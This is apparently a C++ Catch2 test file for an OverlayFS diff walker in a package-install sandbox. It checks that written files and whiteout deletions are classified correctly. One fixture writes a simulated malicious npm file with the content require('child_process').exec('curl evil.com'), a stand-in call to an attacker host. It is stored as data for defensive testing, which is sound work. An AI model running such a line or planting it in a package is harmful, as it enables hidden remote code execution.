// tests/test_diff_walker.cpp
//
// Tests for the OverlayFS upper-dir walker (shadow diff).
// We simulate what the OverlayFS upper layer looks like after a package
// install by creating real files in a temp dir, then verifying the walker
// correctly classifies them as created, modified, or deleted (whiteout).
//
// Run:  ./shadow_tests [diff]

#include "catch2/catch_amalgamated.hpp"
#include <string>
#include <vector>
#include <set>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <dirent.h>
#include <sys/stat.h>
#include <functional>
#include <cstring>
#include <unistd.h>

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// Replicate the diff walker logic from main.cpp so we can test it without
// running the full sandbox. Returns two sets: created/modified files and
// deleted (whiteout) files.
// ---------------------------------------------------------------------------
struct DiffResult {
    std::vector<std::string> written;   // paths of new/modified files
    std::vector<std::string> deleted;   // logical paths of deleted files (whiteout resolved)
};

static DiffResult walk_upper(const std::string& upper_dir) {
    DiffResult result;
    if (upper_dir.empty()) return result;

    std::function<void(const std::string&, const std::string&)> walk =
        [&](const std::string& dir, const std::string& rel_prefix) {
            DIR* d = opendir(dir.c_str());
            if (!d) return;

            struct dirent* ent;
            while ((ent = readdir(d)) != nullptr) {
                std::string name(ent->d_name);
                if (name == "." || name == "..") continue;

                std::string full  = dir + "/" + name;
                std::string rel   = rel_prefix + "/" + name;

                // OverlayFS whiteout: file was deleted
                if (name.size() > 4 && name.substr(0, 4) == ".wh.") {
                    result.deleted.push_back(rel_prefix + "/" + name.substr(4));
                    continue;
                }

                struct stat st;
                if (lstat(full.c_str(), &st) != 0) continue;

                if (S_ISDIR(st.st_mode)) {
                    walk(full, rel);
                } else {
                    result.written.push_back(rel);
                }
            }
            closedir(d);
        };

    walk(upper_dir, "");
    return result;
}

// ---------------------------------------------------------------------------
// Fixture: creates a temp dir, populates it, cleans up after the test.
// ---------------------------------------------------------------------------
struct TmpDir {
    fs::path path;

    TmpDir() {
        path = fs::temp_directory_path() / ("shadow_test_" + std::to_string(getpid()));
        fs::create_directories(path);
    }
    ~TmpDir() {
        fs::remove_all(path);
    }

    // Create a file with optional content
    void create_file(const std::string& rel, const std::string& content = "test") {
        fs::path p = path / rel;
        fs::create_directories(p.parent_path());
        std::ofstream f(p);
        f << content;
    }

    // Create an OverlayFS whiteout file (simulates a deleted file)
    void create_whiteout(const std::string& rel_dir, const std::string& deleted_name) {
        fs::path p = path / rel_dir / (".wh." + deleted_name);
        fs::create_directories(p.parent_path());
        std::ofstream f(p); // empty whiteout file
    }
};

// ============================================================
// Basic walker tests
// ============================================================
TEST_CASE("diff walker — empty upper dir returns empty result", "[diff]") {
    TmpDir d;
    auto result = walk_upper(d.path.string());
    CHECK(result.written.empty());
    CHECK(result.deleted.empty());
}

TEST_CASE("diff walker — missing upper dir returns empty result", "[diff]") {
    auto result = walk_upper("/tmp/shadow_nonexistent_upper_dir_xyz");
    CHECK(result.written.empty());
    CHECK(result.deleted.empty());
}

TEST_CASE("diff walker — empty string returns empty result", "[diff]") {
    auto result = walk_upper("");
    CHECK(result.written.empty());
    CHECK(result.deleted.empty());
}

TEST_CASE("diff walker — single written file detected", "[diff]") {
    TmpDir d;
    d.create_file("package.json", "{\"name\":\"evil\"}");

    auto result = walk_upper(d.path.string());
    REQUIRE(result.written.size() == 1);
    CHECK(result.written[0] == "/package.json");
    CHECK(result.deleted.empty());
}

TEST_CASE("diff walker — multiple written files detected", "[diff]") {
    TmpDir d;
    d.create_file("node_modules/axios/package.json");
    d.create_file("node_modules/axios/lib/axios.js");
    d.create_file("node_modules/axios/README.md");
    d.create_file("package-lock.json");

    auto result = walk_upper(d.path.string());
    CHECK(result.written.size() == 4);
    CHECK(result.deleted.empty());

    std::set<std::string> paths(result.written.begin(), result.written.end());
    CHECK(paths.count("/node_modules/axios/package.json"));
    CHECK(paths.count("/node_modules/axios/lib/axios.js"));
    CHECK(paths.count("/node_modules/axios/README.md"));
    CHECK(paths.count("/package-lock.json"));
}

TEST_CASE("diff walker — whiteout file detected as deletion", "[diff]") {
    TmpDir d;
    // Simulate a package that deleted /tmp/somefile during install
    d.create_whiteout("", "somefile");

    auto result = walk_upper(d.path.string());
    CHECK(result.written.empty());
    REQUIRE(result.deleted.size() == 1);
    CHECK(result.deleted[0] == "/somefile");
}

TEST_CASE("diff walker — mixed written and deleted files", "[diff]") {
    TmpDir d;
    d.create_file("node_modules/evil/index.js", "require('child_process').exec('curl evil.com')");
    d.create_file("node_modules/evil/package.json");
    d.create_whiteout("", "package.json");  // deleted the sandbox package.json

    auto result = walk_upper(d.path.string());
    CHECK(result.written.size() == 2);
    CHECK(result.deleted.size() == 1);
    CHECK(result.deleted[0] == "/package.json");
}

TEST_CASE("diff walker — nested directory structure walked recursively", "[diff]") {
    TmpDir d;
    d.create_file("a/b/c/deep.txt");
    d.create_file("a/b/shallow.txt");
    d.create_file("a/top.txt");
    d.create_file("root.txt");

    auto result = walk_upper(d.path.string());
    CHECK(result.written.size() == 4);

    std::set<std::string> paths(result.written.begin(), result.written.end());
    CHECK(paths.count("/a/b/c/deep.txt"));
    CHECK(paths.count("/a/b/shallow.txt"));
    CHECK(paths.count("/a/top.txt"));
    CHECK(paths.count("/root.txt"));
}

TEST_CASE("diff walker — whiteout in subdirectory resolved correctly", "[diff]") {
    TmpDir d;
    d.create_whiteout("node_modules/axios", "axios.js");

    auto result = walk_upper(d.path.string());
    CHECK(result.written.empty());
    REQUIRE(result.deleted.size() == 1);
    CHECK(result.deleted[0] == "/node_modules/axios/axios.js");
}

TEST_CASE("diff walker — files named starting with .wh that are NOT whiteouts", "[diff]") {
    // OverlayFS whiteout prefix is exactly ".wh." (4 chars including the dot).
    // A file named ".wh" (no trailing dot) or ".whatsapp" is a regular file.
    TmpDir d;
    d.create_file(".wh");           // 3 chars — not a whiteout
    d.create_file(".whrc");         // no dot after wh — not a whiteout
    d.create_whiteout("", "real");  // this IS a whiteout: .wh.real

    auto result = walk_upper(d.path.string());
    // .wh and .whrc are regular files
    CHECK(result.written.size() == 2);
    // only .wh.real is a deletion
    REQUIRE(result.deleted.size() == 1);
    CHECK(result.deleted[0] == "/real");
}
